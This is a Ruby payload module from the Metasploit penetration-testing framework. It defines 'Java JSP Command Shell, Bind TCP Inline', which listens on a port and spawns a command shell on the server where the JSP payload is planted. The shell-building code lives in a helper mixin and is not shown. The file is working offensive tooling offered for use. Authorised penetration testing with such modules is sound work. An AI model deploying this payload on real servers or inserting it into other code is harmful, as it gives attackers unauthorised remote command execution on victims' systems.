##
# This module requires Metasploit: https://metasploit.com/download
# Current source: https://github.com/rapid7/metasploit-framework
##

module MetasploitModule
  CachedSize = 1593

  include Msf::Payload::Single
  include Msf::Payload::JSP
  include Msf::Sessions::CommandShellOptions

  def initialize(info = {})
    super(
      merge_info(
        info,
        'Name' => 'Java JSP Command Shell, Bind TCP Inline',
        'Description' => 'Listen for a connection and spawn a command shell',
        'Author' => [ 'sf' ],
        'License' => MSF_LICENSE,
        'Platform' => %w[linux osx solaris unix win],
        'Arch' => ARCH_JAVA,
        'Handler' => Msf::Handler::BindTcp,
        'Session' => Msf::Sessions::CommandShell,
        'Payload' => {
          'Offsets' => {},
          'Payload' => ''
        }
      )
    )
  end

  def generate(_opts = {})
    return super + jsp_bind_tcp
  end
end
